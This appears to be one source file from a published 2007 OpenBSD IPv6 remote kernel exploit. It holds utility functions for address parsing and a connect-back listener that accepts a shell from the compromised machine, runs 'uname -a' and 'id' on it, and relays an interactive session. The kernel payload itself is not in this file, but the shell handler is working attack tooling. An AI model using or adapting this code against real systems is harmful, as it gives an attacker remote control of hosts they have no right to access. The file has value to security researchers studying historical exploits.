/*
 * OpenBSD IPv6 remote kernel exploit.
 *
 *  Copyright (c) 2007 Claes M. Nyberg <cmn@signedness.org>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dnet.h>
#include "print.h"


/*
 * Translate MAC address to raw bytes
 */
int
macstr(unsigned char *mac, unsigned char *raw)
{
    if (strlen((char *)mac) != 17) {
        err("Bad length of hardware address string (expected 17)\n");
        return(-1);
    }

    raw[0] = (uint8_t)strtoul((char *)&mac[0], NULL, 16);
    raw[1] = (uint8_t)strtoul((char *)&mac[3], NULL, 16);
    raw[2] = (uint8_t)strtoul((char *)&mac[6], NULL, 16);
    raw[3] = (uint8_t)strtoul((char *)&mac[9], NULL, 16);
    raw[4] = (uint8_t)strtoul((char *)&mac[12], NULL, 16);
    raw[5] = (uint8_t)strtoul((char *)&mac[15], NULL, 16);
    return(0);
}


/*
 * Translate network byte ordered IP address into its
 * dotted decimal representation.
 */
const char *
ntoa_ip(uint32_t ip)
{
    struct in_addr ipa;
    ipa.s_addr = ip;
    return(inet_ntoa(ipa));
}


/*
 * Handle connection.
 */
int
handle_connect_back(int lsock)
{
    struct sockaddr_in sin;
    u_int addrlen;
    char inbuf[8192];
    fd_set readset;
    ssize_t n;
    int nfd;
    int sock;

    addrlen = sizeof(struct sockaddr_in);
    printf("[*] Waiting for connect back\n");
    if ( (sock = accept(lsock, (struct sockaddr *)&sin, &addrlen)) < 0) {
        err_errno("accept");
        return(-1);
    }
    close(lsock);

	printf("[*] Connection from %s:%u\n", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
    printf("[*] Welcome to OpenBSD!\n");
    printf("-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n");
    write(sock, "uname -a\n", 9);
    write(sock, "id\n", 3);

    if ( (nfd = sock +1) > FD_SETSIZE) {
        err("FD_SETSIZE to small!\r\n");
        return(-1);
    }

    FD_ZERO(&readset);
    FD_SET(sock, &readset);
    FD_SET(STDIN_FILENO, &readset);

    for (;;) {
        fd_set readtmp;
        memcpy(&readtmp, &readset, sizeof(readtmp));
        memset(inbuf, 0x00, sizeof(inbuf));

        if (select(nfd, &readtmp, NULL, NULL, NULL) < 0) {
            if (errno == EINTR)
                continue;
            err_errno("select()");
            return(1);
        }

        if (FD_ISSET(sock, &readtmp)) {
            if ( (n = read(sock, inbuf, sizeof(inbuf))) < 0) {
                err_errno("read()");
                break;
            }
            if (n == 0) break;
            if (write(STDOUT_FILENO, inbuf, n) != n) {
                err_errno("write()");
                return(1);
            }
        }

        if (FD_ISSET(STDIN_FILENO, &readtmp)) {
            if ( (n = read(STDIN_FILENO, inbuf, sizeof(inbuf))) < 0) {
                err_errno("read()");
                break;
            }
            if (n == 0) break;
            if (write(sock, inbuf, n) != n) {
                err_errno("write()");
                return(1);
            }
        }


    }
    return(0);
}


/*
 * Accept connect back connection.
 * ip and port in network bytes order.
 */
int
listen_connect_back(uint32_t ip, uint16_t port)
{
    struct sockaddr_in sin;
    u_int addrlen;
    int lsock;
    int yes;

    yes = 1;
    addrlen = sizeof(struct sockaddr_in);

    memset(&sin, 0x00, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = port;
    sin.sin_addr.s_addr = ip;

    /* Create IPv4 socket */
    if ( (lsock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        err_errno("socket");
        return(-1);
    }

    /* Reuse address */
    if (setsockopt(lsock, SOL_SOCKET, SO_REUSEADDR,
            (void *)&yes, sizeof(yes)) < 0) {
        err_errno("setsockopt");
        return(-1);
    }

    /* Bind socket to address */
    if ( bind(lsock, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        err_errno("bind");
        return(-1);
    }

    if (listen(lsock, 5) < 0) {
        err_errno("listen");
        return(-1);
    }

    return(lsock);
}


/*
 * Resolve IPv4 address of interface
 *
 */
long
iface_ip(const char *iface)
{
	struct intf_entry ife;
	intf_t *itf;

	if ( (itf = intf_open()) == NULL)
		errx("Failed to open interface structure to obtain connect back IP\n");

	snprintf(ife.intf_name, sizeof(ife.intf_name), "%s", iface);
	intf_get(itf, &ife);
	intf_close(itf);

	if (ife.intf_addr.addr_type != ADDR_TYPE_IP) {
		err_errno("%s is not a IPv4 interface, can not extract connect back IP\n", iface);
		return(-1);
	}

	return(ife.intf_addr.__addr_u.__ip);
}


/*
 * Translate hostname or dotted decimal host address
 * into a network byte ordered IP address.
 * Returns -1 on error.
 */
long
net_inetaddr(const char *host)
{
    long haddr;
    struct hostent *hent;

    if ( (haddr = inet_addr(host)) == -1) {
        if ( (hent = gethostbyname(host)) == NULL)
            return(-1);
        memcpy(&haddr, (hent->h_addr), sizeof(haddr));
    }
    return(haddr);
}


/*
 * Translate ip:port string.
 * Returns NULL on error.
 */
int
netaddr(const char *str, uint32_t *s_ip, uint16_t *s_port)
{
    char *host;
    char *port;
    int p = 0;

    host = strdup(str);

    if ( (port = strchr(host, ':')) != NULL) {
        *port = '\0';
        port++;
        p = atoi(port);

        if (p > 65535 || p < 1) {
            free(host);
			return(-1);
		}
        *s_port = htons(p);
    }

    /* ':port' is allowed */
    if (*host != '\0') {
        if ( (int)(*s_ip = net_inetaddr(host)) == -1) {
			free(host);
			return(-1);
		}
    }

	free(host);
    return(0);
}

